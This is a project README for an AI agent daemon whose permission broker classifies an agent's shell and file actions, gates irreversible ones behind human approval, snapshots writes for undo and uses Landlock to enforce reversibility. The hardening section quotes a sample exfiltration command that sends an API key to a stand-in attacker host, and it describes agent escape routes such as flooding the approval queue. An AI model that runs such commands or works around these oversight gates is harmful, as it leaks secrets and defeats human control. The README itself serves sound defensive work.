# Nefertari OS

**An AI-native system layer for Linux.** The agent is not an app — it is a first-class citizen of the machine: it can see everything, act on everything, and *every action has an undo*.

> Status: early prototype (phase 1 — `agentd` + permission broker on WSL2 / any Linux).

## The thesis

Giving an AI root access takes 5 minutes. The hard problem is doing it so that:

1. **Every write action is reversible** — automatic snapshot before, one-command undo after.
2. **Nothing irreversible happens without a human gate** — not as a convention the AI is asked to respect, but as physics of the system: the broker sits between the agent and the machine.
3. **Everything is auditable** — an append-only journal records every action, its classification, its outcome.

## Architecture (phase 1)

```
┌────────────────────────────┐
│  Any MCP client            │  Claude Code, ania, Team AI executor…
│  (the "brain")             │
└────────────┬───────────────┘
             │ MCP (stdio)
┌────────────▼───────────────┐
│  agentd                    │  packages/agentd
│  ┌──────────────────────┐  │
│  │ permission broker    │  │  classifies: reversible / noisy / irreversible
│  ├──────────────────────┤  │
│  │ snapshot engine      │  │  pluggable: file-copy (anywhere) → btrfs → nix
│  ├──────────────────────┤  │
│  │ journal (append-only)│  │  ~/.nefertari/journal.jsonl
│  └──────────────────────┘  │
└────────────┬───────────────┘
             │
      Linux host: WSL2 · container (Railway) · VM · bare metal
```

The same `agentd` runs unmodified on:
- **WSL2** (primary dev target — desktop companion for Windows comes in phase 2)
- **Containers** (Railway, Docker) — headless mode, snapshot backend = file-copy or overlay
- **Any Linux** (VM, bare metal) — snapshot backend = btrfs/ZFS when available

## Action classes

| Class | Examples | Broker decision |
|---|---|---|
| `reversible` | read file, write file (snapshotted), restart service, redirect to `/dev/null` | pass |
| `noisy` | install package, open port | pass + notify |
| `irreversible` | delete outside snapshot, send data out, spend money, unknown shell command, write to a sensitive path | **human approval required** |

Unknown = irreversible. The safe default is not "trust the AI", it's "prove reversibility or ask".

### What the broker specifically catches

The shell classifier is defense-in-depth: a global danger scan over the raw
string (command/process substitution, `eval`, pipe-into-interpreter, output
redirect to a real file/device) runs *before* a per-segment allowlist where the
whole is only as safe as its weakest segment. On top of that, phase-1 hardening
closed the obvious escape routes:

- **Data-out over plain GET.** `curl`/`wget` with exfil flags (`-d`, `-F`, `-o`,
  POST…) was already gated; now a *plain GET with a query string* to a
  non-allowlisted host is gated too — `curl https://evil.com/log?token=$API_KEY`
  is a data-out channel even without POST. Trusted hosts go in
  `NEFERTARI_NET_ALLOW` (comma-separated); a query to those stays reversible.
- **Writes to sensitive paths.** `fs_write`/`fs_delete` to shell startup files,
  cron, systemd units, `~/.ssh`, sudoers/pam.d, or code-exec config
  (`.gitconfig`, `.git/hooks`, `.npmrc`) are irreversible even though they are
  snapshotted — the effect can fire before anyone gets to undo it.
- **Approval-queue flood.** At most `NEFERTARI_MAX_PENDING` (default 25) distinct
  irreversible actions can wait at once; past the cap new ones are refused
  outright, so a hostile agent can't bury a human in prompts until they
  rubber-stamp one (approval fatigue).
- **No-op redirects don't nag.** A redirect whose only target is `/dev/null`
  (or `/dev/stdout`/`/dev/stderr`) is a no-op, so `command -v gh 2>/dev/null`
  stays reversible instead of being gated as a "write".

## Kernel-enforced reversibility (`nefertari-enforce`)

The broker's verdict is only as good as the process that respects it. To make
"reversible" *physics* rather than *policy*, reversible shell commands run under
[Landlock](https://docs.kernel.org/userspace-api/landlock.html) — the
unprivileged Linux LSM (kernel ≥ 5.13, no root needed). `packages/enforce` is a
~330 KB Rust wrapper: it confines the command's writes to the working directory
(+ `/tmp` scratch + `/dev/null`) and lets the rest of the filesystem stay
read/execute, then `execve`s the command so the restriction is inherited and
cannot be dropped.

```bash
cd packages/enforce && cargo build --release
export NEFERTARI_ENFORCE_BIN=$PWD/target/release/nefertari-enforce   # agentd auto-detects it
```

Proven on the WSL2 kernel (6.6, Landlock ABI 3): a reversible command that tries
to write outside its working dir gets `EACCES` **from the kernel**, while the
same write inside the dir succeeds (`packages/agentd/test/enforce.mjs`). This
binds the reversibility verdict to enforcement — agentic frameworks classify;
Nefertari classifies *and* the kernel holds the line. Honest scope: Landlock ABI
3 confines **writes** (reversibility), not confidentiality or network egress —
egress stays the broker's job. If the binary is absent, agentd fails open to
plain `bash` unless `NEFERTARI_ENFORCE=1` forces fail-closed.

## Quick start

```bash
cd packages/agentd
npm install
node src/server.mjs          # starts the MCP server on stdio
```

Register it in any MCP client (e.g. Claude Code):

```bash
claude mcp add nefertari -- node /path/to/packages/agentd/src/server.mjs
```

### Docker (headless, any host / Railway)

A public image runs the headless approval API in a non-root container:

```bash
docker pull ghcr.io/xquantumtech/nefertari-agentd:latest
docker run -d -p 7343:7343 \
  -e NEFERTARI_TOKEN=$(openssl rand -hex 16) \
  -v nefertari-data:/data \
  ghcr.io/xquantumtech/nefertari-agentd:latest
# health: curl localhost:7343/health   ·   approve: POST /pending/:id/approve (Bearer)
```

`docker-compose.yml` and `railway.json` are in `packages/agentd`. On Railway,
set the service **Root Directory** to `packages/agentd` and it builds the
Dockerfile directly. The image is published by CI
(`.github/workflows/docker-publish.yml`) on every push to `main`.

Human gate CLI:

```bash
node src/cli.mjs pending             # list actions waiting for approval
node src/cli.mjs approve <id>        # approve one
node src/cli.mjs journal 20          # tail the journal
node src/cli.mjs undo <snapshot_id>  # restore a snapshot
node src/cli.mjs serve               # headless approval API (containers/Railway):
                                     #   GET /pending · POST /pending/:id/approve|deny
                                     #   Bearer token in ~/.nefertari/token or NEFERTARI_TOKEN
```

## Windows companion (phase 2, block 1)

If agentd runs in WSL2, you approve from Windows — no shell into WSL needed.
`packages/companion-win/nefertari-companion.ps1` (zero deps, PowerShell 5.1):

```powershell
.\nefertari-companion.ps1                 # watch: toast on every new pending + keys 1-9 / A / D
.\nefertari-companion.ps1 -Once           # list pending and exit
.\nefertari-companion.ps1 -Approve <id>   # approve
.\nefertari-companion.ps1 -Deny <id>      # deny
.\nefertari-companion.ps1 -Journal 20     # tail the audit journal
```

The companion never reimplements gate logic: it shells into agentd's own CLI
inside WSL, so there is exactly one approval implementation.

## Real-model tests

`examples/ania-on-nefertari.mjs` connects a live LLM (any OpenAI-compatible
endpoint) to agentd over MCP and gives it a sysadmin task whose only path is an
irreversible action. Verified with kat-coder-pro-v2.5 on AtlasCloud: the model
works normally through reversible tools, hits the gate on `rm -rf`, and stops —
with the data physically untouched on disk.

`examples/team-ai-on-nefertari.mjs` goes further: a Fortuna **Team AI ops
executor** (same kat-coder brain) is told to install the GitHub CLI and clone a
repo. On a real run it did 7 reversible/read actions — 3 of the 5 shell runs
confined by Landlock — and had 6 acquisition steps (`apt-get update/install`,
`curl … -o`, a `curl | dd` keyring import) stopped at the human gate. It
recognised each `pending_approval` as expected and did not try to bypass it. Run
it with `examples/run-atlas-teamai.sh` (reads the Atlas key from a local `.env`;
no secret ever touches a command line).

## Roadmap

- **Phase 1** (done): agentd + broker + journal + snapshots, MCP over stdio.
  Hardened: sensitive-path gating, GET-query exfil + net allowlist, approval-queue
  cap, `/dev/null` no-op redirects. Tests: red-team 63/63, smoke 23/23, HTTP 6/6,
  enforce (live Landlock proof), real-model + Team AI runs. Public Docker image + CI.
- **Phase 2** (started): kernel-enforced reversibility (✅ `nefertari-enforce`,
  Landlock ABI 3, proven), Windows companion (✅ toasts + approve/deny from
  Windows; next: UI Automation eyes/hands), NixOS-WSL custom distro with native
  declarative rollback, and the socket-daemon form of the enforcer.
- **Phase 3**: desktop control via accessibility APIs (AT-SPI / UIA / AXUIElement), local model routing, voice.

## License

TBD (leaning AGPL / fair-code — open core).
